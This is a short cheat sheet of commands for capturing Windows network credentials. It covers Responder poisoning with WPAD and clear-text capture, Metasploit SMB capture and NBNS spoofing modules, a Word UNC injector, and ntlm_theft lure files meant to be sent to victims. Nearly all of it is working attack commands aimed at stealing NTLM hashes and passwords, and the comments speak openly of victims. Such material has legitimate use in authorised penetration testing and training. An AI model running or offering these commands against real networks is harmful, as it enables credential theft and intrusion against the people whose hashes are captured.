
Capture credentials :

using Responsder :
```bash
responder -I eth0
sudo responder -I eth0 -dwPv
responder -I eth0 -wd  #Starting wpad and DHCP server.
responder -I eth0 -A
responder -I eth0 -wdF -b #get clear text password , in victum browser run fun.local
responder -I eth0 -e 192.168.1.2
responder -I eth0 -wdF --lm --disable-es
```

using metasploit capture:
```
set JOHNPWFILE /path/to/store/john_hashes.txt
set CAINPWFILE /path/to/store/cain_hashes.txt

msfconsole -x "use auxiliary/server/capture/smb; set SRVHOST 192.168.178.136; set SRVPORT 445; set SMBDomain WORKGROUP; run"

# using spoofing:
msfconsole -q -x "use auxiliary/spoof/nbns/nbns_response; set SPOOFIP 192.168.1.103; set INTERFACE eth0; run; exit"

```

using unc injector:
```bash
msfconsole -q -x "use auxiliary/docx/word_unc_injector; set LHOST 192.168.1.103; run; exit"
#then start server/capture/smb
```


using ntlm_theft:
```bash
python3 ntlm_theft.py -g all -s 192.168.1.3 -f test
python3 ntlm_theft.py -g modern -s 192.168.1.3 -f ignite
#send the generated file to victums and then start listener
```